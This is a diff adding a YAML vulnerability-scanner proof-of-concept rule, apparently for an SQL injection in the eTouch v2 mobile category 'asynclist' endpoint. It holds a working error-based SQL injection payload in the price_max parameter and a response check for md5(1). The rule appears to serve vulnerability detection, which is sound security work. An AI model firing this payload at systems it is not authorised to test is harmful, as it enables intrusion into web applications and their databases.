@@ -1,0 +1,12 @@
+name: poc-yaml-etouch-v2-sqli
+rules:
+  - method: GET
+    path: >-
+      /upload/mobile/index.php?c=category&a=asynclist&price_max=1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5(1),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)'
+    expression: |
+      response.status == 200 && response.body.bcontains(b"c4ca4238a0b923820dcc509a6f75849b")
+detail:
+  author: MaxSecurity(https://github.com/MaxSecurity)
+  links:
+    - https://github.com/mstxq17/CodeCheck/
+    - https://www.anquanke.com/post/id/168991
